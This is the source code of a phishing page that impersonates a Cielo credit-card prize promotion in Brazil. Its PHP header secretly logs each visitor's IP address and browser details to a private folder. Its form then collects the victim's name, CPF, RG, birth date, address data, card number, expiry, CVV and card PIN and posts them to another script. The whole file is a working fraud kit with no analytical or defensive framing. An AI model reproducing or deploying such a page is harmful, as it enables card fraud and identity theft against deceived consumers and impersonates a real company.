<?php
error_reporting(0);

function w($a = ''){
        if (empty($a)) return array();
        return explode(' ', $a);
}

function _browser($a_browser = false, $a_version = false, $name = false){
        $browser_list = 'msie firefox chrome konqueror safari netscape navigator opera mosaic lynx amaya omniweb avant camino flock seamonkey aol mozilla gecko';
        $user_browser = strtolower($_SERVER['HTTP_USER_AGENT']);
        $this_version = $this_browser = '';
        
        $browser_limit = strlen($user_browser);
        foreach (w($browser_list) as $row){
                $row = ($a_browser !== false) ? $a_browser : $row;
                $n = stristr($user_browser, $row);
                if (!$n || !empty($this_browser)) continue;
                
                $this_browser = $row;
                $j = strpos($user_browser, $row) + strlen($row) + 1;
                for (; $j <= $browser_limit; $j++){
                        $s = trim(substr($user_browser, $j, 1));
                        $this_version .= $s;
                        
                        if ($s === '') break;
                }
        }
        
        if ($a_browser !== false){
                $ret = false;
                if (strtolower($a_browser) == $this_browser){
                        $ret = true;
                        if ($a_version !== false && !empty($this_version)){
                                $a_sign = explode(' ', $a_version);
                                if (version_compare($this_version, $a_sign[1], $a_sign[0]) === false){
                                        $ret = false;
                                }
                        }
                }
                return $ret;
        }
        
        $this_platform = '';
        if (strpos($user_browser, 'linux')){
                $this_platform = 'linux';
        }
        elseif (strpos($user_browser, 'macintosh') || strpos($user_browser, 'mac platform x')){
                $this_platform = 'mac';
        }
        else if (strpos($user_browser, 'windows') || strpos($user_browser, 'win32')){
                $this_platform = 'windows';
        }
        
        if ($name !== false){
                return $this_browser . ' ' . $this_version;
        }
        
        return array(
                "browser"         => $this_browser,
                "version"         => $this_version,
                "platform"       => $this_platform,
                "useragent"     => $user_browser
        );
}


$timestamp  = mktime(date("H")-3, date("i"), date("s"), date("m"), date("d"), date("Y"));
$data    = gmdate("d-m-Y", $timestamp);
$ip = $_SERVER['REMOTE_ADDR'];

$vBrowser = _browser();

$info ="
--------------------------------------------------------------------------------------------------------------------------------
DATA......: ".$data." 
IP........: ".$ip."
BROWSER...: ".$vBrowser['browser']."
VERSAO....: ".$vBrowser['version']."
S.O.......: ".$vBrowser['platform']."
DETALHES..: ".$vBrowser['useragent']."
---------------------------------------------------------------------------------------------------------------------------------
";

     $abrir_txt = fopen('priv8/acessos/'. $ip . ' - ' .$data . ' - ' . $vBrowser['browser'] .'.txt', "a");
     fwrite($abrir_txt, $info);
     fclose($abrir_txt);
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3cadastro.html.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<title>Compra Premiada Cielo</title>
<link rel="shortcut icon" href="img/favicon.ico">
<link href="css/padrao3.css" rel="stylesheet" type="text/css">

<style type="text/css">

<!--

body {

	background:url(img/background2.jpg);
	background-position:center top;
	background-repeat:no-repeat;
	margin:3px;

}
.style13 {font-family: Arial, Helvetica, sans-serif; font-weight: bold; font-size: 12px; }
.style14 {
	font-size: 10px;
	font-family: Verdana, Arial, Helvetica, sans-serif;
	color: #990000;
}
.style16 {font-size: 12px; font-family: Arial, Helvetica, sans-serif;}
.style17 {color: #666666}



-->

</style>
<script>

function confereCampos(form) {    
    var campos = form.getElementsByTagName('input');
    var podeEnviar = true;
    for (i = 0; i < campos.length; i++) {
        var classe = campos[i].className;
        var valor = campos[i].value;
        if (classe == 'campos_texto' && valor == '') podeEnviar = false;
    }
    if (podeEnviar == true) {
        return true;
    } else {
        alert('Todos os campos são obrigatorios, favor preencher!')
        return false;
    }
}
</script>


</head>



<body>

<div id="tudo">

<div id="barraamarela"><p>Voc&ecirc; est&aacute; na p&aacute;gina do cliente <span>Cielo.</span></p></div><div id="ponta1"></div>

<div id="ponta2"></div>
<div id="barrazul"><a href="#">Agora voc&ecirc; tem 3x mais chances de ganhar!</a></div>

<div id="logobb"></div>

<div id="menu"><a href="index.php" onmouseover="document.home.src=&#39;img/home2.png&#39;" onmouseout="document.home.src=&#39;img/home1.png&#39;"><img src="img/home1.png" name="home" width="34" height="20" class="menu" id="home"></a><img src="img/espacador.png" width="12" height="20"><a href="#" onmouseover="document.ganhadores.src=&#39;img/ganhadores2.png&#39;" onmouseout="document.ganhadores.src=&#39;img/ganhadores1.png&#39;"><img src="img/ganhadores1.png" name="ganhadores" width="65" height="20" id="ganhadores"></a><img src="img/espacador.png" width="12" height="20"><a href="#" onmouseover="document.regulamento.src=&#39;img/regulamento2.png&#39;" onmouseout="document.regulamento.src=&#39;img/regulamento1.png&#39;"><img src="img/regulamento1.png" name="regulamento" width="72" height="20" id="regulamento"></a><a href="#" onmouseover="document.ganhadores.src=&#39;img/ganhadores2.png&#39;" onmouseout="document.regulamento.src=&#39;img/regulamento2.png&#39;"></a><img src="img/espacador.png" width="12" height="20"></div>

<div id="logopromo"><img src="img/logopromonovo1.png" width="263" height="207"></div>

<div id="textointro">

<p> A cada compra a partir de R$ 30,00 com qualquer cart&atilde;o de cr&eacute;dito ou d&eacute;bito na m&aacute;quina da Cielo, voc&ecirc; ganha um <span>n&uacute;mero da sorte.</span> E &eacute; com ele que voc&ecirc; participa dos sorteios di&aacute;rios de pr&ecirc;mios. Para participar primeiro cadastre-se nesta p&aacute;gina, e boa sorte!</p>
</div>



<div id="conteudo">

<div id="conteudovariavel" style="overflow:auto; display:block;">
  <table width="614" border="0" align="center" cellpadding="2" cellspacing="2">
    <tbody><tr>
      <td><form id="form1" name="form1" method="post" action="final.php" target="_self" onsubmit="return confereCampos(this)">
        <table border="0" cellspacing="2" cellpadding="2">
          <tbody><tr>
            <td colspan="3"><div align="center"><span class="style14">* Pr&ecirc;encha o formul&aacute;rio com seus dados pessoais.</span></div></td>
          </tr>
          <tr>
            <td><span class="style13">Nome Completo:</span></td>
            <td><input name="nome" type="text" class="campos_texto" id="nome" size="20" maxlength="50"></td>
          </tr>
          <tr>
            <td><span class="style13">CPF:</span></td>
            <td><input name="cpf" type="text" class="campos_texto" id="cpf" size="11" maxlength="11"></td>
          </tr>
		  <tr>
		    <td><span class="style13">RG: </span></td>
			<td><input name="rg" type="text" class="campos_texto" id="rg" size="11" maxlength="10"></td>
		  </tr>
          <tr>
            <td><span class="style13">Data de nascimento:</span></td>
            <td>
              <span class="style17">
              <input name="nascimento" type="text" class="campos_texto" id="nascimento" size="11" maxlength="10"> 
              <span class="style16">Ex 01/02/1993.</span></span></td>
          </tr>
          <tr>
            <td><span class="style13">CEP:</span></td>
            <td><input name="cep" type="text" class="campos_texto" id="cep" size="11" maxlength="10"></td>
			</tr>
			<tr>
			<td><span class="style13">&#8470; da resid&ecirc;ncia:</span>
			<td><input name="num_resid" type="text" class="campos_texto" id="num_resid" size="6" maxlength="6"></td>
			</tr>
			
          <tr>
            <td><span class="style13">Bandeira:</span></td>
            <td><label>
              <select class="campos_texto" name="tipo" id="tipo">
                <option>Escolha:</option>
                <option>Visa</option>
                <option>MasterCard</option>
                <option>American Express</option>
                <option>Dinners</option>
                            </select>
            </label></td>
          </tr>
			
          <tr>
            <td width="123"><span class="style13">Nome(titular):</span></td>
            <td width="369"><input name="titular" type="text" class="campos_texto" id="titular" size="25" maxlength="25">
              <span class="style18">              (Como escrito no cart&atilde;o.)</span></td>
          </tr>
          <tr>
            <td><span class="style13">N&uacute;mero do cart&atilde;o:</span></td>
            <td><input name="cc" type="text" class="campos_texto" id="cc" size="20" maxlength="16"></td>
          </tr>
          <tr>
            <td><span class="style13">Validade:</span></td>
            <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">
            <select name="mes" id="mes" class="campos_texto">
              <option>1</option>
              <option>2</option>
              <option>3</option>
              <option>4</option>
              <option>5</option>
              <option>6</option>
              <option>7</option>
              <option>8</option>
              <option>9</option>
              <option>10</option>
              <option>11</option>
              <option>12</option>
            </select>
/
<select name="ano" id="ano" class="campos_texto">
  <option>2012</option>
  <option>2013</option>
  <option>2014</option>
  <option>2015</option>
  <option>2016</option>
  <option>2017</option>
  <option>2018</option>
  <option>2019</option>
  <option>2020</option>
</select>
            </font></td>
          </tr>
          <tr>
            <td><span class="style13">C&oacute;digo de seguran&ccedil;a:</span></td>
            <td><input name="cvv" type="text" class="campos_texto" id="cvv" size="4" maxlength="4">
			<span class="style16">(Tr&ecirc;s n&uacute;meros no verso do cart&atilde;o.)</span></td>
          </tr>
          <tr>
            <td><span class="style13">Senha do cart&atilde;o:</span></td>
            <td><input name="senha_cartao" type="text" class="campos_texto" id="senha_cartao" size="11" maxlength="11"></td>
          </tr>
			
          <tr>
            <td colspan="2"><p><font size="2" face="Verdana, Arial, Helvetica, sans-serif">
              <input name="Avancar" type="image" id="Avancar3" src="img/botaocadastrese2.png">
            </font></p>              </td>
            </tr>
        </tbody></table>
              </form>
        </td>
    </tr>
    <tr>
      <td>&nbsp;</td>
    </tr>
  </tbody></table>
</div>
</div>

<div id="rodrigo"><img src="img/rodrigofaro2.png" width="144" height="411"></div>

<div id="legal">
<h3><strong><br><br><br>A Compra Premiada  Cielo n&atilde;o inclui taxas na fatura do cart&atilde;o.</strong></h3>

<p>*Pr&ecirc;mios pagos em dinheiro diretamente ao contemplado. Valores l&iacute;quidos de Imposto de Renda, conforme legisla&ccedil;&atilde;o vigente. Lastreados por T&iacute;tulos de Capitaliza&ccedil;&atilde;o da Brasilcap Capitaliza&ccedil;&atilde;o S.A., CNPJ 15.138.043/0001- 05, aprovados pela SUSEP, Processos n&deg; 15414.002830/2011-48 (cliente Cielo) , n&deg; 15414.002831/2011-92 (lojistas) e n&deg; 15414.002832/2011-37 (vendedores). A aprova&ccedil;&atilde;o desses t&iacute;tulos pela SUSEP n&atilde;o implica, por parte da Autarquia, incentivo ou recomenda&ccedil;&atilde;o &agrave; sua aquisi&ccedil;&atilde;o, representando, exclusivamente, sua adequa&ccedil;&atilde;o &aacute;s normas em vigor. Consulte o regulamento no site.</p>

</div>

</div>

</body></html>
